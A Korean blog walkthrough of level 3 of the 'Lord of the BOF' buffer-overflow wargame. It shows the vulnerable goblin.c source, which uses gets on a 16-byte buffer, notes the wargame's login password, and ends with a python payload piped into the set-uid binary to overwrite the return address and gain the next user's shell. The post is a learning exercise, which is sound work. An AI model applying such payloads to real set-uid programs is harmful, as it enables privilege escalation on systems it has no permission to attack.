---
title: BOF/ LOB-level3(cobolt)
tags: LOB
---

LOB란 The Lord of the BOF의 약자로 Buffer over-flow를 연습해 볼 수 있는 해킹문제이다.    
총 20문제로 구성되어 있으며 각 문제를 격파하여 다음 레벨의 패스워드를 얻는 형식입니다.  
문제를 격파하고 다음 레벨의 bash를 획득하였다면 my-pass로 패스워드를 확인할 수 있습니다.  

 [send me email](mailto:jewel7492@gmail.com) if you have any questions.

<!--more-->

---
### LOB Level 3(cobolt)
**ID : cobolt**  
**PASSWD : hacking exposed**         

```bash
$ bash2
```
풀이 시작 전에 bash2로 꼭 변경  
**bash는 \xff를 \x00(NULL)로 인식하여 제대로 문제를 풀 수 없다.**  

![그림1](/assets/LOB/level3/1.PNG)  
사용자 goblin의 권한의 goblin파일이 있음을 확인할 수 있다.  
**set-uid가 걸려있으므로 사용자 goblin의 권한으로 파일을 실행할 수 있다.**  
**goblin파일이 쉘을 실행시키도록 한다면 사용자 goblin의 쉘을 획득할 수 있다.**  

<br />
{% highlight C linenos %}  
/*
        The Lord of the BOF : The Fellowship of the BOF
        - goblin
        - small buffer + stdin
*/

int main()
{
    char buffer[16];
    gets(buffer);
    printf("%s\n", buffer);
}
{% endhighlight %}  

**goblin.c**

### 소스분석  
1. buffer의 크기가 16Byte이다.  
[LOB(level2)](https://limjunho.github.io/2019/11/03/LOB-level2(gremlin).html)**와 매우 유사하나 프로그램 실행 시 인자를 전달받는것이 아닌 실행 중에 인자를 전달 받는다.**  
2. argc가 2보다 작다면 "ergv error"을 출력하고 프로그램을 종료한다.  
**argc란? - 파라미터의 개수를 의미한다. 즉 main에 최소 2개이상의 인자를 전달하여야 한다.**  
3. buffer에 gets로 값을 입력받아 출력하는 소스  
**gets함수는 입력받을 데이터의 크기제한이 없기 때문에 입력받은 값이 16Byte보다 크다면 buffer-overflow가 발생하는 취약점이 있다.**  

### Solution  
**[LOB(level2)](https://limjunho.github.io/2019/11/03/LOB-level2(gremlin).html)와 같은방식으로 문제풀이 단, 다른 방식으로 값 전달**  


### Attack   

![그림2](/assets/LOB/level3/2.PNG)  
공격 성공.   
**python으로 값을 출력한 다음, 표준 입력을 표준 출력으로 바꿔주는 역할을 하는 cat명령어로 값을 넘겨주도록 한다.**  
**세미콜론은 한줄에 명령어를 여러개 입력할때 사용한다는 점에서 파이프와 비슷하지만 파이프의 경우 앞에서 나온 결과값을 뒤의 명령에서 사용한다는 점이 대조된다.**  
**그리고 나서 앞의 결과를 파이프가 goblin에게 넘겨준다.**  

**페이로드**
```bash
$ (python -c "print 'A'*20  + '\xc1\xfe\xff\xbf'"; cat) | ./goblin
```